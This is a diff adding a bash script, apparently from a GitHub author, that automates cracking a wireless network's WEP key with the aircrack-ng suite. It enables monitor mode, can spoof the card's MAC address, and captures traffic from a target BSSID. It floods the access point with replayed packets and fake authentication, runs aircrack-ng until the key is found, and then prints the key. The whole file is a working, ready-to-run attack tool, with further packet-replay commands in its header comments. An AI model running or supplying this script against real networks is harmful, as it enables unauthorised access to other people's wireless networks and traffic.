@@ -1,0 +1,116 @@
+#!/bin/bash
+# @author DominikStyp
+# @url https://github.com/DominikStyp
+# Replay methods 
+################
+# FIRST SETUP TARGET VARIABLE WITH AP MAC
+# TARGET=00:14:6C:7E:40:80
+# Natural Packets Replay (with client which is connected)
+#    aireplay-ng -2 -b  -d FF:FF:FF:FF:FF:FF -t 1 mon0
+# Modified Packet Replay
+#    aireplay-ng -2 -b $TARGET -t 1 -c FF:FF:FF:FF:FF:FF -p 0841 mon0
+# aireplay-ng -2 -a $TARGET -d FF:FF:FF:FF:FF:FF -m 68 -n 68 -t 1 -f 0 ath0
+
+
+################# FUNCTIONS ##############
+getKonsolePidByProcessName(){
+    ps aux | grep konsole | grep "$1" | awk -F" " '{print $2}'
+}
+
+# echo green text
+echoGreen(){
+   echo "$(tput setaf 2)${1}$(tput sgr0)"
+}
+
+restartMonitor() {
+  airmon-ng stop mon0
+  airmon-ng stop wlan0
+  airmon-ng check kill
+  airmon-ng start wlan0;
+}
+################# FUNCTIONS END ##########
+
+if [[ -z "$1" || -z "$2" ]]; then
+  echo "Using: $0 [BSSID] [CHANNEL] [[SPOOFED_MAC]]";
+  exit;
+fi
+
+restartMonitor;
+
+if [[ -z $(ifconfig | grep mon0) ]]; then
+  echo "Something is wrong, can't start monitor mode for wlan0";
+  exit;
+fi
+BSSID=$1;
+CHANNEL=$2;
+BSSID_CLEAR=$(echo $BSSID | sed s/://g);
+
+# spoofed mac ?
+if [[ ! -z "$3" ]]; then
+  WIFI_CARD_MAC=$3;
+  MAC_CHANGE_CMD="-h $WIFI_CARD_MAC";
+  ifconfig mon0 down;
+  macchanger -m $WIFI_CARD_MAC mon0;
+  ifconfig mon0 up;
+fi
+
+##### vars
+BSSID_LOG="$BSSID_CLEAR.log";
+CURRENT_DIR=$(pwd);
+PACKETS_DIR="${CURRENT_DIR}/packetsLog/";
+PACKETS_LOG="${PACKETS_DIR}/${BSSID_LOG}";
+LOGGING_PACKETS="airodump-ng mon0 --bssid=$BSSID -c $CHANNEL -w ${PACKETS_LOG}";
+KEY_FOUND_LOG="${CURRENT_DIR}/KEY_FOUND_${BSSID_CLEAR}";
+FILE_WILDCARD="${PACKETS_DIR}/${BSSID_CLEAR}*.cap";
+
+##### commands
+if [[ ! -d "$PACKETS_DIR" ]]; then
+  mkdir --mode 700 $PACKETS_DIR;
+fi
+echoGreen "COMMANDS INVOKED IN SEPARATED WINDOWS ARE OUTPUTTED IN GREEN";
+konsole --hold --title "WEP-ATTACK: Airodump-ng LOGGING_PACKETS" --workdir $CURRENT_DIR -e /bin/sh -c "${LOGGING_PACKETS}" 2>/dev/null;
+echoGreen "${LOGGING_PACKETS}";
+# aireplay-ng: injecting packets (300 per second)
+INJECT="aireplay-ng -3 -x 50 -b ${BSSID} mon0";
+konsole --hold --title "WEP-ATTACK: Aireplay-ng INJECT" --workdir $CURRENT_DIR -e /bin/sh -c "${INJECT}" 2>/dev/null;
+echoGreen "${INJECT}";
+# aireplay-ng: fake auth: -1 [delay] -a [BSSID]
+FAKE_AUTH="aireplay-ng -1 60 -a ${BSSID} -c FF:FF:FF:FF:FF:FF ${MAC_CHANGE_CMD} mon0"
+konsole --hold --title "WEP-ATTACK: Aireplay-ng FAKE_AUTH" --workdir $CURRENT_DIR -e /bin/sh -c "${FAKE_AUTH}" 2>/dev/null;
+echoGreen "${FAKE_AUTH}";
+# aircrack-ng: cracking packets log files
+AIRCRACK_CMD="aircrack-ng -l ${KEY_FOUND_LOG} ${FILE_WILDCARD}";
+
+CAP_FILE="";
+while [[ -z $CAP_FILE ]]; do
+    for CHECK_FILE in $(ls $FILE_WILDCARD); do
+	 CAP_FILE="${CHECK_FILE}";
+	 break; # break for
+    done;
+    if [[ -z $CAP_FILE ]]; then
+	echo "Still can't see file ${FILE_WILDCARD}... waiting";
+	sleep 60;
+    else 
+	break; #break while
+    fi
+   
+done;
+
+echoGreen "${AIRCRACK_CMD}";
+konsole --hold --title "WEP-ATTACK: Aircrack-ng" --workdir $CURRENT_DIR -e /bin/sh -c "${AIRCRACK_CMD}" 2>/dev/null;
+# periodical checking if KEY_FOUND file exists
+while true; do
+  if [[ -f "${KEY_FOUND_LOG}" ]]; then
+      kill -INT $(getKonsolePidByProcessName aireplay-ng)
+      kill -INT $(getKonsolePidByProcessName airodump-ng)
+      killall -INT aireplay-ng
+      killall -INT airodump-ng
+      echo "!!!! KEY WAS FOUND !!!!"
+      echo "---------- YOUR WEP KEY IS: ----------------"
+      echo $(cat ${KEY_FOUND_LOG})
+      echo "--------------------------------------------"
+      echo "You have it also in file: ${KEY_FOUND_LOG}"
+      exit;
+  fi
+  sleep 30;
+done
